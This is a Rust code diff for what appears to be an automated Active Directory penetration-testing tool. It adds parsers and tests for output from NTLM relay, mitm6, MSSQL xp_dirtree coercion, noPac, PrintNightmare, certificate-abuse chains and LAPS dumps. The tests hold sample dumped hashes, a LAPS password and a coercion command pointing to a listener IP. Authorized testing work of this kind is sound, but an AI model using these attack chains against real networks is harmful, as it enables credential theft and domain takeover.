@@ -26,7 +26,8 @@ pub use bloodhound::{
 pub use certipy::{parse_certipy_esc1_chain, parse_certipy_find};
 pub use cracker::parse_cracker_output;
 pub use credential_tools::{
-    parse_adidnsdump, parse_ldap_descriptions, parse_lsassy, parse_ntds_dit, parse_spray_success,
+    parse_adidnsdump, parse_laps, parse_ldap_descriptions, parse_lsassy, parse_ntds_dit,
+    parse_spray_success,
 };
 pub use delegation::{extract_delegation_account, parse_delegation};
 pub use mssql::{parse_mssql_impersonation, parse_mssql_linked_servers};
@@ -274,7 +275,11 @@ pub fn parse_tool_output(tool_name: &str, output: &str, params: &Value) -> Value
                 discoveries["vulnerabilities"] = Value::Array(vec![vuln]);
             }
         }
-        "certipy_esc1_full_chain" | "certipy_esc13_full_chain" | "certipy_auth" => {
+        "certipy_esc1_full_chain"
+        | "certipy_esc4_full_chain"
+        | "certipy_esc7_full_chain"
+        | "certipy_esc13_full_chain"
+        | "certipy_auth" => {
             // All emit "Got hash for 'user@realm': <lm>:<nt>" (certipy auth) and/or
             // the secretsdump `krbtgt:...:::` DCSync line on success.
             set_if_nonempty(
@@ -555,6 +560,158 @@ pub fn parse_tool_output(tool_name: &str, output: &str, params: &Value) -> Value
             if !hashes.is_empty() {
                 discoveries["hashes"] = Value::Array(hashes);
             }
+        }
+        "ntlmrelayx_to_smb"
+        | "ntlmrelayx_to_ldaps"
+        | "ntlmrelayx_to_adcs"
+        | "ntlmrelayx_multirelay" => {
+            let mut hashes = secrets::parse_netntlmv2(output, params, tool_name);
+            let (sd_hashes, sd_creds) = parse_secretsdump(output, params);
+            hashes.extend(sd_hashes);
+            set_if_nonempty(&mut discoveries, "hashes", hashes);
+            set_if_nonempty(&mut discoveries, "credentials", sd_creds);
+
+            if output.contains("Writing PKCS#12 certificate to")
+                || output.contains("Base64 certificate of user")
+                || output.contains("GOT CERTIFICATE!")
+            {
+                let ca_host = params.get("ca_host").and_then(|v| v.as_str()).unwrap_or("");
+                let relayed_user = output.lines().find_map(|l| {
+                    l.find("Base64 certificate of user ")
+                        .map(|i| &l[i + "Base64 certificate of user ".len()..])
+                        .and_then(|rest| rest.split_whitespace().next())
+                        .map(|u| u.trim_end_matches(':').to_string())
+                });
+                let user = relayed_user.unwrap_or_default();
+                let user_safe = user.replace(['$', '.'], "_");
+                let ca_safe = ca_host.replace('.', "_");
+                let mut details = serde_json::Map::new();
+                if !user.is_empty() {
+                    details.insert("target_user".into(), json!(user));
+                    details.insert("account_name".into(), json!(user));
+                }
+                if !ca_host.is_empty() {
+                    details.insert("ca_host".into(), json!(ca_host));
+                    details.insert("target_ip".into(), json!(ca_host));
+                }
+                details.insert("source".into(), json!(tool_name));
+                let vuln = json!({
+                    "vuln_id": format!("certificate_obtained_{user_safe}_{ca_safe}"),
+                    "vuln_type": "certificate_obtained",
+                    "target": ca_host,
+                    "discovered_by": tool_name,
+                    "details": details,
+                });
+                let mut vulns = discoveries
+                    .get("vulnerabilities")
+                    .and_then(|v| v.as_array())
+                    .cloned()
+                    .unwrap_or_default();
+                vulns.push(vuln);
+                discoveries["vulnerabilities"] = Value::Array(vulns);
+            }
+        }
+        "start_mitm6" => {
+            let hashes = secrets::parse_netntlmv2(output, params, "start_mitm6");
+            if !hashes.is_empty() {
+                discoveries["hashes"] = Value::Array(hashes);
+            }
+        }
+        "mssql_ntlm_coerce" => {
+            let hashes = secrets::parse_netntlmv2(output, params, "mssql_ntlm_coerce");
+            if !hashes.is_empty() {
+                discoveries["hashes"] = Value::Array(hashes);
+            }
+            let target = params.get("target").and_then(|v| v.as_str()).unwrap_or("");
+            let listener_ip = params
+                .get("listener_ip")
+                .and_then(|v| v.as_str())
+                .unwrap_or("");
+            if !target.is_empty() && !listener_ip.is_empty() {
+                let target_safe = target.replace('.', "_");
+                let listener_safe = listener_ip.replace('.', "_");
+                let vuln = json!({
+                    "vuln_id": format!("mssql_ntlm_coerce_{target_safe}_{listener_safe}"),
+                    "vuln_type": "coercion_attempted",
+                    "target": target,
+                    "discovered_by": "mssql_ntlm_coerce",
+                    "details": {
+                        "target_ip": target,
+                        "listener_ip": listener_ip,
+                        "unc_path": format!("\\\\{listener_ip}\\share"),
+                        "coercion_method": "xp_dirtree",
+                    },
+                });
+                let mut vulns = discoveries
+                    .get("vulnerabilities")
+                    .and_then(|v| v.as_array())
+                    .cloned()
+                    .unwrap_or_default();
+                vulns.push(vuln);
+                discoveries["vulnerabilities"] = Value::Array(vulns);
+            }
+        }
+        "nopac" => {
+            let hashes = parse_certipy_esc1_chain(output, params);
+            set_if_nonempty(&mut discoveries, "hashes", hashes);
+            if output.contains(".ccache")
+                || output.contains("Impersonating")
+                || output.contains("Impersonated")
+                || output.contains("Restoring the machine account")
+            {
+                let target_ip = params
+                    .get("dc_ip")
+                    .or_else(|| params.get("target_ip"))
+                    .or_else(|| params.get("target"))
+                    .and_then(|v| v.as_str())
+                    .unwrap_or("");
+                let domain = params.get("domain").and_then(|v| v.as_str()).unwrap_or("");
+                let target_safe = target_ip.replace('.', "_");
+                let vuln = json!({
+                    "vuln_id": format!("nopac_{target_safe}"),
+                    "vuln_type": "nopac",
+                    "target": target_ip,
+                    "discovered_by": "nopac",
+                    "details": {
+                        "cve": "CVE-2021-42278/CVE-2021-42287",
+                        "domain": domain,
+                        "target_ip": target_ip,
+                        "description": format!("noPac sAMAccountName spoofing exploited against {target_ip}"),
+                    },
+                });
+                let mut vulns = discoveries
+                    .get("vulnerabilities")
+                    .and_then(|v| v.as_array())
+                    .cloned()
+                    .unwrap_or_default();
+                vulns.push(vuln);
+                discoveries["vulnerabilities"] = Value::Array(vulns);
+            }
+        }
+        "printnightmare" => {
+            let target = params.get("target").and_then(|v| v.as_str()).unwrap_or("");
+            let looks_successful = output.contains("Stub loaded")
+                || output.contains("DLL loaded")
+                || output.contains("Exploit completed")
+                || output.contains("[+] Triggering")
+                || output.contains("Successfully triggered");
+            if looks_successful && !target.is_empty() {
+                let target_safe = target.replace('.', "_");
+                discoveries["vulnerabilities"] = json!([{
+                    "vuln_id": format!("printnightmare_{target_safe}"),
+                    "vuln_type": "printnightmare",
+                    "target": target,
+                    "discovered_by": "printnightmare",
+                    "details": {
+                        "cve": "CVE-2021-1675/CVE-2021-34527",
+                        "target_ip": target,
+                        "description": format!("PrintNightmare exploited on {target}"),
+                    },
+                }]);
+            }
+        }
+        "laps_dump" => {
+            set_if_nonempty(&mut discoveries, "credentials", parse_laps(output, params));
         }
         _ => {}
     }
@@ -1780,6 +1937,237 @@ SMB  192.168.58.121  445  DC01  bob         2026-03-25 23:21:09 0  Bob"#;
         assert_eq!(vulns[0]["vuln_type"], "certificate_obtained");
         // No user in details when RELAYED_USER is absent
         assert!(vulns[0]["details"].get("target_user").is_none());
+    }
+
+    // ── certipy_esc4/esc7_full_chain reuse the ESC1/ESC13/auth arm ────
+
+    #[test]
+    fn parse_tool_output_certipy_esc4_full_chain_extracts_hash() {
+        let output = "[*] Got hash for 'administrator@CONTOSO.LOCAL': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0";
+        let disc = parse_tool_output(
+            "certipy_esc4_full_chain",
+            output,
+            &json!({"domain": "contoso.local"}),
+        );
+        let hashes = disc["hashes"].as_array().expect("hashes");
+        assert_eq!(hashes.len(), 1);
+        assert_eq!(hashes[0]["username"], "administrator");
+        assert_eq!(hashes[0]["domain"], "contoso.local");
+    }
+
+    #[test]
+    fn parse_tool_output_certipy_esc7_full_chain_extracts_hash() {
+        let output = "[*] Got hash for 'administrator@CONTOSO.LOCAL': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0";
+        let disc = parse_tool_output(
+            "certipy_esc7_full_chain",
+            output,
+            &json!({"domain": "contoso.local"}),
+        );
+        assert_eq!(disc["hashes"].as_array().unwrap().len(), 1);
+    }
+
+    // ── ntlmrelayx_* arms ─────────────────────────────────────────────
+
+    #[test]
+    fn parse_tool_output_ntlmrelayx_to_adcs_emits_certificate_obtained() {
+        let output = "\
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-1: Received connection from 192.168.58.20, attacking target http://ca01.contoso.local/certsrv/certfnsh.asp as CONTOSO/DC01$
+[*] Authenticating against http://ca01.contoso.local/certsrv/certfnsh.asp as CONTOSO/DC01$ SUCCEED
+[*] GOT CERTIFICATE! ID 42
+[*] Base64 certificate of user DC01$:
+MIIRegistrationBlobHereBase64Data==
+[*] Writing PKCS#12 certificate to ./DC01.pfx";
+        let params = json!({
+            "ca_host": "192.168.58.50",
+        });
+        let disc = parse_tool_output("ntlmrelayx_to_adcs", output, &params);
+        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
+        assert_eq!(vulns.len(), 1);
+        assert_eq!(vulns[0]["vuln_type"], "certificate_obtained");
+        assert_eq!(vulns[0]["details"]["target_user"], "DC01$");
+        assert_eq!(vulns[0]["target"], "192.168.58.50");
+        let vid = vulns[0]["vuln_id"].as_str().unwrap();
+        assert!(!vid.contains('$'), "vuln_id must sanitise $: {vid}");
+    }
+
+    #[test]
+    fn parse_tool_output_ntlmrelayx_multirelay_parses_dumped_sam_hashes() {
+        let output = "\
+[*] Servers started, waiting for connections
+[*] Authenticating against smb://192.168.58.30 as CONTOSO/WEB01$ SUCCEED
+[*] Service RemoteRegistry is in stopped state
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+localadmin:1001:aad3b435b51404eeaad3b435b51404ee:abcdef1234567890abcdef1234567890:::
+[*] Cleaning up...";
+        let params = json!({"target_domain": "contoso.local"});
+        let disc = parse_tool_output("ntlmrelayx_multirelay", output, &params);
+        let hashes = disc["hashes"].as_array().expect("hashes");
+        assert!(
+            hashes.len() >= 2,
+            "expected dumped SAM hashes to land, got {hashes:?}"
+        );
+        assert!(hashes.iter().any(|h| h["username"] == "Administrator"));
+    }
+
+    #[test]
+    fn parse_tool_output_ntlmrelayx_to_ldaps_captures_netntlmv2() {
+        let output = "\
+[*] Servers started, waiting for connections
+[SMB] NTLMv2-SSP Hash     : svc_test::CONTOSO:1122334455667788:aabbccddeeff00112233445566778899:0101000000000000000102030405060708090a";
+        let params = json!({"dc_ip": "192.168.58.10", "domain": "contoso.local"});
+        let disc = parse_tool_output("ntlmrelayx_to_ldaps", output, &params);
+        assert!(
+            disc.get("hashes")
+                .and_then(|v| v.as_array())
+                .is_some_and(|a| !a.is_empty()),
+            "should extract folded NetNTLMv2 hash from ntlmrelayx stdout"
+        );
+    }
+
+    #[test]
+    fn parse_tool_output_ntlmrelayx_to_smb_no_capture_stays_silent() {
+        let output = "[*] Servers started, waiting for connections\n[*] Setting up SMB Server\n";
+        let params = json!({"target_ip": "192.168.58.30"});
+        let disc = parse_tool_output("ntlmrelayx_to_smb", output, &params);
+        assert!(disc.get("hashes").is_none());
+        assert!(disc.get("vulnerabilities").is_none());
+    }
+
+    // ── start_mitm6 ───────────────────────────────────────────────────
+
+    #[test]
+    fn parse_tool_output_start_mitm6_extracts_netntlmv2() {
+        let output = "\
+Starting mitm6 using the domain: contoso.local
+[SMB] NTLMv2-SSP Hash     : alice::CONTOSO:1122334455667788:aabbccddeeff00112233445566778899:0101000000000000000102030405060708090a";
+        let params = json!({"domain": "contoso.local"});
+        let disc = parse_tool_output("start_mitm6", output, &params);
+        assert!(disc.get("hashes").is_some());
+    }
+
+    #[test]
+    fn parse_tool_output_start_mitm6_silent_without_hash() {
+        let output = "Starting mitm6 using the domain: contoso.local\n";
+        let params = json!({"domain": "contoso.local"});
+        let disc = parse_tool_output("start_mitm6", output, &params);
+        assert!(disc.get("hashes").is_none());
+    }
+
+    // ── mssql_ntlm_coerce ─────────────────────────────────────────────
+
+    #[test]
+    fn parse_tool_output_mssql_ntlm_coerce_emits_coercion_marker() {
+        let output = "SQL (CONTOSO\\alice  guest@master)> EXEC master..xp_dirtree '\\\\192.168.58.5\\share'\nsubdirectory       depth";
+        let params = json!({
+            "target": "192.168.58.30",
+            "listener_ip": "192.168.58.5",
+        });
+        let disc = parse_tool_output("mssql_ntlm_coerce", output, &params);
+        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
+        assert_eq!(vulns.len(), 1);
+        assert_eq!(vulns[0]["vuln_type"], "coercion_attempted");
+        assert_eq!(vulns[0]["target"], "192.168.58.30");
+        assert_eq!(vulns[0]["details"]["unc_path"], "\\\\192.168.58.5\\share");
+    }
+
+    #[test]
+    fn parse_tool_output_mssql_ntlm_coerce_survives_empty_output() {
+        let params = json!({"target": "192.168.58.30", "listener_ip": "192.168.58.5"});
+        let disc = parse_tool_output("mssql_ntlm_coerce", "", &params);
+        assert_eq!(
+            disc["vulnerabilities"].as_array().unwrap()[0]["vuln_type"],
+            "coercion_attempted"
+        );
+    }
+
+    #[test]
+    fn parse_tool_output_mssql_ntlm_coerce_skipped_when_params_missing() {
+        let disc = parse_tool_output("mssql_ntlm_coerce", "", &json!({}));
+        assert!(disc.get("vulnerabilities").is_none());
+    }
+
+    // ── nopac ─────────────────────────────────────────────────────────
+
+    #[test]
+    fn parse_tool_output_nopac_extracts_dcsync_hashes() {
+        let output = "\
+[*] Getting TGT for CONTOSO\\bob
+[*] Impersonating administrator
+[*] Saving ticket in administrator.ccache
+[*] Dumping Domain Credentials\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9163a4143c00569b53db0feef6bdf2ad:::";
+        let params = json!({
+            "domain": "contoso.local",
+            "dc_ip": "192.168.58.10",
+        });
+        let disc = parse_tool_output("nopac", output, &params);
+        let hashes = disc["hashes"].as_array().expect("hashes");
+        assert_eq!(hashes.len(), 1);
+        assert_eq!(hashes[0]["username"], "krbtgt");
+        assert_eq!(hashes[0]["domain"], "contoso.local");
+        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
+        assert_eq!(vulns[0]["vuln_type"], "nopac");
+        assert_eq!(vulns[0]["target"], "192.168.58.10");
+    }
+
+    #[test]
+    fn parse_tool_output_nopac_silent_on_failure() {
+        let output = "[-] noPac exploitation failed: target patched (KB5008380)";
+        let disc = parse_tool_output(
+            "nopac",
+            output,
+            &json!({"domain": "contoso.local", "dc_ip": "192.168.58.10"}),
+        );
+        assert!(disc.get("hashes").is_none());
+        assert!(disc.get("vulnerabilities").is_none());
+    }
+
+    // ── printnightmare ────────────────────────────────────────────────
+
+    #[test]
+    fn parse_tool_output_printnightmare_emits_vuln_on_success_marker() {
+        let output = "\
+[*] Impacket v0.9.24\n[+] Connected to smb\n[+] Triggering spooler service to load DLL\n[+] Exploit completed";
+        let params = json!({"target": "192.168.58.22"});
+        let disc = parse_tool_output("printnightmare", output, &params);
+        let vulns = disc["vulnerabilities"].as_array().expect("vulns");
+        assert_eq!(vulns[0]["vuln_type"], "printnightmare");
+        assert_eq!(vulns[0]["target"], "192.168.58.22");
+    }
+
+    #[test]
+    fn parse_tool_output_printnightmare_silent_on_failure() {
+        let output = "[-] Failed to load DLL\n";
+        let disc = parse_tool_output(
+            "printnightmare",
+            output,
+            &json!({"target": "192.168.58.22"}),
+        );
+        assert!(disc.get("vulnerabilities").is_none());
+    }
+
+    // ── laps_dump ─────────────────────────────────────────────────────
+
+    #[test]
+    fn parse_tool_output_laps_dump_extracts_admin_creds() {
+        let output = "\
+LDAP  192.168.58.10  389  DC01  [*] Getting LAPS Passwords
+LDAP  192.168.58.10  389  DC01  Computer:SRV01                    Password:LapsPass!Local";
+        let params = json!({"domain": "contoso.local"});
+        let disc = parse_tool_output("laps_dump", output, &params);
+        let creds = disc["credentials"].as_array().expect("credentials");
+        assert_eq!(creds.len(), 1);
+        assert_eq!(creds[0]["username"], "Administrator");
+        assert_eq!(creds[0]["password"], "LapsPass!Local");
+        assert_eq!(creds[0]["source_host"], "SRV01");
+        assert_eq!(creds[0]["is_admin"], true);
+    }
+
+    #[test]
+    fn parse_tool_output_laps_dump_empty_output() {
+        let disc = parse_tool_output("laps_dump", "", &json!({"domain": "contoso.local"}));
+        assert!(disc.get("credentials").is_none());
     }
 
     #[test]
